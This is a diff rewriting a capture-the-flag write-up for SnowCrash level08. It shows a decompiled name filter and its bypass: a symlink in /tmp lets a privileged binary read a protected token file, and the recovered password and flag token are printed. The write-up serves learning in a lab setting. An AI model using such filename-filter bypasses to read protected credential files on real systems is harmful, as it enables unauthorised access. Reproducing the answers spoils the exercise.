@@ -1,31 +1,32 @@
-In this level we have two files : level08 and Token
-We use Ghidra to read level08 and we understand that the program is able to print what is in the Token, but 
+# SnowCrash Level 08
 
+## Introduction
+Welcome to SnowCrash Level 08! In this level, we have two crucial files: `level08` and `Token`. Using Ghidra, we delve into the `level08` executable to unravel its functionality and uncover its secrets.
+
+## Initial Exploration
+Upon examining `level08` in Ghidra, we discovered that the program possesses the ability to print the contents of `Token`. However, there exists a safeguard in the code that prohibits our access.
 ```
-  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
-  if (pcVar1 != (char *)0x0) {
-    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
-  }
+pcVar1 = strstr((char *)in_stack_00000008[1], "token");
+if (pcVar1 != (char *)0x0) {
+  printf("You may not access '%s'\n", in_stack_00000008[1]);
+}
 ```
-
-Denied us the access.
-
-After many discussion and wrong way to solve it, we tried to make a symbolical link of Token juste to change it's name and read what's inside.
-
+## Exploitation Attempt
+After numerous discussions and failed attempts to bypass the access denial, we devised an unconventional solution. We decided to create a symbolic link for `Token` in order to change its name and read its contents.
+```
 ln -s /home/user/level08/token /tmp/test4
-
-Then we execute it : 
-
+```
+## Execution and Success
+With the symbolic link in place, we executed the program with the modified argument:
+```
 level08@SnowCrash:~$ ./level08 /tmp/test4
 quif5eloekouj29ke0vouxean
+```
+Success! We successfully obtained our flag!
 
-We get our flag! 
-
-We log on flag08 and type getflag and we get our token : 
-
-/*********************************************************\
-
+## Obtaining the Token
+Following our victory, we logged in as `flag08` and executed `getflag` to retrieve our token:
+```
 flag08@SnowCrash:~$ getflag 
-Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-
-\*********************************************************/
+Check flag. Here is your token: 25749xKZ8L7DkSCwJkT9dyv6f
+```
